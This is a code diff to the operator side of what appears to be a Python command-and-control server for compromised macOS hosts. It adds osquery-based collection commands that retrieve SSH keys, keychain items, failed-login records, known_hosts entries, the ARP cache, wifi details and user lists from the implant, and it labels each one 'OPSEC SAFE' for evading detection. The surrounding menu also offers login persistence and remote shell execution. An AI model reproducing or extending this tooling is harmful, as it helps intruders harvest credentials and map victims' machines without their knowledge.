@@ -72,6 +72,23 @@ class ClientThread(Thread):
                 print(">\033[33munpersist\033[0m: Remove the login persistence. \033[91mMAY NOT BE OPSEC SAFE (launchctl unload invoked to unload the persistence)\033[0m")
                 print(">\033[33mshell [shell command]\033[0m: Run a shell command...\033[91mNOT OPSEC SAFE (spawns processes for each shell command run)\033[0m")
                 print('')
+                print("--->OSQUERY<---")
+                print(">\033[33mcheck_osquery\033[0m: Check to see if osquery is on this host: \033[92mIS OPSEC SAFE\033[0m")
+                print(">\033[33mosquery_users\033[0m: Use osquery to pull back local users: \033[92mIS OPSEC SAFE\033[0m")
+                print(">\033[33mosquery_loggedin\033[0m: Use osquery to pull logged in user info: \033[92mIS OPSEC SAFE\033[0m")
+                print(">\033[33mosquery_usersshkeys\033[0m: Use osquery to pull ssh key info: \033[92mIS OPSEC SAFE\033[0m")
+                print(">\033[33mosquery_knownhosts\033[0m: Use osquery to pull back ssh known_hosts: \033[92mIS OPSEC SAFE\033[0m")
+                print(">\033[33mosquery_failedlogins\033[0m: Use osquery to pull back failed login and password last set info: \033[92mIS OPSEC SAFE\033[0m")
+                print(">\033[33mosquery_apps\033[0m: Use osquery to pull back a list of apps: \033[92mIS OPSEC SAFE\033[0m")
+                print(">\033[33mosquery_runningapps\033[0m: Use osquery to list currently running apps: \033[92mIS OPSEC SAFE\033[0m")
+                print(">\033[33mosquery_arpcache\033[0m: Use osquery to pull the arp cache: \033[92mIS OPSEC SAFE\033[0m")
+                print(">\033[33mosquery_keychainitems\033[0m: Use osquery to list keychain items: \033[92mIS OPSEC SAFE\033[0m")
+                print(">\033[33mosquery_osversion\033[0m: Use osquery to pull OS version info: \033[92mIS OPSEC SAFE\033[0m")
+                print(">\033[33mosquery_systeminfo\033[0m: Use osquery to pull basic system info: \033[92mIS OPSEC SAFE\033[0m")
+                print(">\033[33mosquery_wifi\033[0m: Use osquery to pull wifi info: \033[92mIS OPSEC SAFE\033[0m")
+                print(">\033[33mosquery_processinfo\033[0m: Use osquery to process info: \033[92mIS OPSEC SAFE\033[0m")
+                print(">\033[33mosquery_interfaces\033[0m: Use osquery to list local network interfaces: \033[92mIS OPSEC SAFE\033[0m")
+                print('')
                 print("--->OTHER<---")
                 print(">\033[33mexit\033[0m: Exit the session and stop the client")
                 print("-"*100)
@@ -98,6 +115,8 @@ class ClientThread(Thread):
                 data = connection.recv(1024)
                 data2 = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace("!EOF!",'')
                 print("\033[92m%s\033[0m" % str(data2))
+
+            
             elif (('cat' in command) and ('shell' not in command)):
                 connection.send(command.encode('utf8'))
                 data = connection.recv(8192)
@@ -149,7 +168,306 @@ class ClientThread(Thread):
                     print("Current network connections:")
                     z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
                     print("\033[92m%s\033[0m" % str(z))
-            
+
+            elif 'check_osquery' in command:
+                connection.send(command.encode('utf8'))
+                data = connection.recv(8192)
+
+                if len(data) < 8192:
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+                else:
+                    while True:
+                        g = connection.recv(8192)
+                        end = bytes('!EOF!', encoding='utf-8')
+                        if end in g:
+                            break
+                        data = data + g
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+            elif 'osquery_processinfo' in command:
+                connection.send(command.encode('utf8'))
+                data = connection.recv(8192)
+
+                if len(data) < 8192:
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+                else:
+                    while True:
+                        g = connection.recv(8192)
+                        end = bytes('!EOF!', encoding='utf-8')
+                        if end in g:
+                            break
+                        data = data + g
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+            elif 'osquery_users' in command:
+                connection.send(command.encode('utf8'))
+                data = connection.recv(8192)
+
+                if len(data) < 8192:
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+                else:
+                    while True:
+                        g = connection.recv(8192)
+                        end = bytes('!EOF!', encoding='utf-8')
+                        if end in g:
+                            break
+                        data = data + g
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+            elif 'osquery_usersshkeys' in command:
+                connection.send(command.encode('utf8'))
+                data = connection.recv(8192)
+
+                if len(data) < 8192:
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+                else:
+                    while True:
+                        g = connection.recv(8192)
+                        end = bytes('!EOF!', encoding='utf-8')
+                        if end in g:
+                            break
+                        data = data + g
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+            elif 'osquery_runningapps' in command:
+                connection.send(command.encode('utf8'))
+                data = connection.recv(8192)
+
+                if len(data) < 8192:
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+                else:
+                    while True:
+                        g = connection.recv(8192)
+                        end = bytes('!EOF!', encoding='utf-8')
+                        if end in g:
+                            break
+                        data = data + g
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+            elif 'osquery_systeminfo' in command:
+                connection.send(command.encode('utf8'))
+                data = connection.recv(8192)
+
+                if len(data) < 8192:
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+                else:
+                    while True:
+                        g = connection.recv(8192)
+                        end = bytes('!EOF!', encoding='utf-8')
+                        if end in g:
+                            break
+                        data = data + g
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+            elif 'osquery_wifi' in command:
+                connection.send(command.encode('utf8'))
+                data = connection.recv(8192)
+
+                if len(data) < 8192:
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+                else:
+                    while True:
+                        g = connection.recv(8192)
+                        end = bytes('!EOF!', encoding='utf-8')
+                        if end in g:
+                            break
+                        data = data + g
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
+                    print("\033[92m%s\033[0m" % str(z))
+                
+
+            elif 'osquery_interfaces' in command:
+                connection.send(command.encode('utf8'))
+                data = connection.recv(8192)
+
+                if len(data) < 8192:
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+                else:
+                    while True:
+                        g = connection.recv(8192)
+                        end = bytes('!EOF!', encoding='utf-8')
+                        if end in g:
+                            break
+                        data = data + g
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+            elif 'osquery_osversion' in command:
+                connection.send(command.encode('utf8'))
+                data = connection.recv(8192)
+
+                if len(data) < 8192:
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+                else:
+                    while True:
+                        g = connection.recv(8192)
+                        end = bytes('!EOF!', encoding='utf-8')
+                        if end in g:
+                            break
+                        data = data + g
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+            elif 'osquery_keychainitems' in command:
+                connection.send(command.encode('utf8'))
+                data = connection.recv(8192)
+
+                if len(data) < 8192:
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+                else:
+                    while True:
+                        g = connection.recv(8192)
+                        end = bytes('!EOF!', encoding='utf-8')
+                        if end in g:
+                            break
+                        data = data + g
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
+                    print("\033[92m%s\033[0m" % str(z))
+                    
+
+            elif 'osquery_failedlogins' in command:
+                connection.send(command.encode('utf8'))
+                data = connection.recv(8192)
+
+                if len(data) < 8192:
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+                else:
+                    while True:
+                        g = connection.recv(8192)
+                        end = bytes('!EOF!', encoding='utf-8')
+                        if end in g:
+                            break
+                        data = data + g
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+            elif 'osquery_loggedin' in command:
+                connection.send(command.encode('utf8'))
+                data = connection.recv(8192)
+
+                if len(data) < 8192:
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+                else:
+                    while True:
+                        g = connection.recv(8192)
+                        end = bytes('!EOF!', encoding='utf-8')
+                        if end in g:
+                            break
+                        data = data + g
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+
+            elif 'osquery_apps' in command:
+                connection.send(command.encode('utf8'))
+                data = connection.recv(8192)
+
+                if len(data) < 8192:
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+                else:
+                    while True:
+                        g = connection.recv(8192)
+                        end = bytes('!EOF!', encoding='utf-8')
+                        if end in g:
+                            break
+                        data = data + g
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+            elif 'osquery_arpcache' in command:
+                connection.send(command.encode('utf8'))
+                data = connection.recv(8192)
+
+                if len(data) < 8192:
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+                else:
+                    while True:
+                        g = connection.recv(8192)
+                        end = bytes('!EOF!', encoding='utf-8')
+                        if end in g:
+                            break
+                        data = data + g
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+            elif 'osquery_knownhosts' in command:
+                connection.send(command.encode('utf8'))
+                data = connection.recv(8192)
+
+                if len(data) < 8192:
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
+                else:
+                    while True:
+                        g = connection.recv(8192)
+                        end = bytes('!EOF!', encoding='utf-8')
+                        if end in g:
+                            break
+                        data = data + g
+                    print("OSQuery Info Pulled Back:")
+                    z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace(", ", "\n").replace("!EOF!",'').strip()
+                    print("\033[92m%s\033[0m" % str(z))
+
             elif (('cd ' in command) and ('shell' not in command)):
                 connection.send(command.encode('utf8'))
                 w = connection.recv(2048)
